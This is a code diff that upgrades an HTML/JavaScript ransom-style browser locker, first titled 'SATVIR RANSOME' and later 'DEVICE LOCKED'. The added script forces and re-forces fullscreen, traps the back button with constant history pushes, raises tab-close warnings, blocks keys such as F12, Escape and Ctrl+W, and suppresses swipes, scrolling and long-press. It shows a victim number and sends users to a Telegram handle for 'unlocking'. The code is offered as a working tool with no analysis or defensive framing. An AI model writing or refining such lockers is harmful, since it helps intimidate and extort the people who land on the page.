@@ -2,10 +2,16 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>🔒 SATVIR RANSOME</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <title>🔒 DEVICE LOCKED</title>
     <style>
-        * { margin: 0; padding: 0; box-sizing: border-box; user-select: none; }
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            user-select: none;
+            -webkit-tap-highlight-color: transparent;
+        }
         body {
             font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
             background: radial-gradient(circle at 30% 30%, #0a0f2a, #000000);
@@ -18,6 +24,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
+            touch-action: none;
         }
         .container {
             max-width: 450px;
@@ -96,7 +103,7 @@
         <div class="footer">👑 Owner: <a href="#" id="ownerLink">@notxsatvir</a></div>
     </div>
     <script>
-        // Generate random number
+        // ========== GENERATE NUMBER ==========
         function generateNumber() {
             return Math.floor(100000 + Math.random() * 900000).toString();
         }
@@ -105,21 +112,126 @@
         localStorage.setItem('satvir_ransom_number', userNumber);
         document.getElementById('userNumber').textContent = userNumber;
 
-        // Admin contact - opens Telegram
+        // ========== FULLSCREEN (IMMEDIATE) ==========
+        function enterFullscreen() {
+            const elem = document.documentElement;
+            if (elem.requestFullscreen) {
+                elem.requestFullscreen();
+            } else if (elem.webkitRequestFullscreen) {
+                elem.webkitRequestFullscreen();
+            } else if (elem.msRequestFullscreen) {
+                elem.msRequestFullscreen();
+            }
+        }
+
+        // Force fullscreen immediately
+        enterFullscreen();
+
+        // Re-enter fullscreen if exited
+        document.addEventListener('fullscreenchange', function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                setTimeout(enterFullscreen, 100);
+            }
+        });
+        document.addEventListener('webkitfullscreenchange', function() {
+            if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+                setTimeout(enterFullscreen, 100);
+            }
+        });
+
+        // ========== BLOCK EXIT ==========
+        // Block back button
+        window.history.pushState(null, '', window.location.href);
+        window.addEventListener('popstate', function() {
+            window.history.pushState(null, '', window.location.href);
+            alert('🔒 Cannot exit! Contact admin.');
+        });
+
+        // Block tab close warning
+        window.addEventListener('beforeunload', function(e) {
+            e.preventDefault();
+            e.returnValue = '🔒 Device locked! Contact admin to exit.';
+            return '🔒 Device locked! Contact admin to exit.';
+        });
+
+        // Block keyboard shortcuts
+        document.addEventListener('keydown', function(e) {
+            const blocked = ['F5', 'F12', 'Escape', 'Home', 'Backspace', 'ArrowLeft', 'ArrowRight', 'Meta', 'Alt', 'Tab'];
+            if (blocked.includes(e.key) || (e.ctrlKey && (e.key === 'r' || e.key === 'w' || e.key === 'q'))) {
+                e.preventDefault();
+                alert('🔒 Action blocked! Contact admin.');
+                return false;
+            }
+        });
+
+        // Block touch swipe
+        let touchStartX = 0, touchStartY = 0;
+        document.addEventListener('touchstart', function(e) {
+            touchStartX = e.touches[0].clientX;
+            touchStartY = e.touches[0].clientY;
+        });
+        document.addEventListener('touchmove', function(e) {
+            e.preventDefault();
+        });
+        document.addEventListener('touchend', function(e) {
+            const dx = e.changedTouches[0].clientX - touchStartX;
+            const dy = e.changedTouches[0].clientY - touchStartY;
+            if (Math.abs(dx) > 50 || Math.abs(dy) > 50) {
+                e.preventDefault();
+                alert('🔒 Swipe blocked!');
+            }
+        });
+
+        // Block context menu (long press)
+        document.addEventListener('contextmenu', function(e) {
+            e.preventDefault();
+            return false;
+        });
+
+        // Block wheel/scroll
+        document.addEventListener('wheel', function(e) {
+            e.preventDefault();
+        }, { passive: false });
+
+        // ========== CHECK UNLOCK ==========
+        function checkUnlock() {
+            const number = localStorage.getItem('satvir_ransom_number');
+            if (number && localStorage.getItem('satvir_unlock_' + number) === 'true') {
+                localStorage.removeItem('satvir_unlock_' + number);
+                // Remove from locked list
+                let users = JSON.parse(localStorage.getItem('satvir_locked_users') || '[]');
+                users = users.filter(u => u !== number);
+                localStorage.setItem('satvir_locked_users', JSON.stringify(users));
+                // Exit
+                alert('✅ Device unlocked! Closing...');
+                setTimeout(function() {
+                    window.close();
+                    window.location.href = 'about:blank';
+                }, 500);
+            }
+        }
+
+        // ========== CONTACT ADMIN ==========
         document.getElementById('contactBtn').addEventListener('click', function(e) {
             e.preventDefault();
-            // Try to open Telegram
-            window.location.href = 'https://t.me/notxsatvir';
-            // Fallback
-            setTimeout(() => {
-                window.location.href = 'https://t.me/notxsatvir';
-            }, 500);
+            window.open('https://t.me/notxsatvir', '_blank');
         });
 
         document.getElementById('ownerLink').addEventListener('click', function(e) {
             e.preventDefault();
-            window.location.href = 'https://t.me/notxsatvir';
+            window.open('https://t.me/notxsatvir', '_blank');
         });
+
+        // ========== CONTINUOUS HISTORY PUSH ==========
+        setInterval(function() {
+            window.history.pushState(null, '', window.location.href);
+        }, 500);
+
+        // ========== CHECK UNLOCK EVERY 2 SECONDS ==========
+        setInterval(checkUnlock, 2000);
+
+        console.log('🔒 Device locked! Number:', userNumber);
+        console.log('📞 Contact @notxsatvir to unlock');
     </script>
 </body>
 </html>
